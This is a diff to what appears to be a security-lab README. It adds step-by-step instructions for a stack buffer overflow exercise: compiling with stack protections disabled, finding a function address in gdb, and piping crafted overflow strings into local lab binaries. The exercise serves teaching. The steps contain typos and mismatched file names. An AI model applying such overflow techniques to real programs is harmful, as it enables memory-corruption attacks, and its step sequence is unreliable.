@@ -79,6 +79,30 @@ The Dockerfile is used to build docker image with full required packages for Han
 ### Visualize the initial attack idea
 ![image](https://github.com/user-attachments/assets/085fefae-1b34-4858-8c32-20a934d187a4)
 
+### Conducting the attack
+1. After creating the seclabs folder, continue to create a folder named bof in seclabs <br>
+`$> mdkir bof` <br>
+2. Open terminal<br>
+`$> cd seclabs` <br>
+`$> cd bof` <br>
+4. Overflow memory we need to fill 40 characters + 4 characters of variable check address <br>
+`$>echo $(python -c "print('a'*40+'\xff\xff\xff\xff')") | ./bof2.out` <br>
+![image](https://github.com/user-attachments/assets/548b9b77-c695-48af-9e64-7334b3b7626d)
+5. Run code command. to open visual studio in terminal <br>
+6. Run docker container from previously built image <br>
+7. Run this command to create file bof1.out<br>
+`$>gcc -g bof3.c -o bof3.out`<br>
+8. Compile program with options to code execution on stack <br>
+`$>gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2` <br>
+9. Load bof3.out in gdb <br>
+`$> gdb -q bof3.out` <br>
+10. Get the shell function address <br>
+`$> disas shell` <br>
+11. Else print out this statement printf("Yeah! You win!\n") <br>
+`$>echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out` <br>
+![image](https://github.com/user-attachments/assets/738be82f-7ceb-487d-9b3b-2a985bde5b0f)
+
+
 
 
    
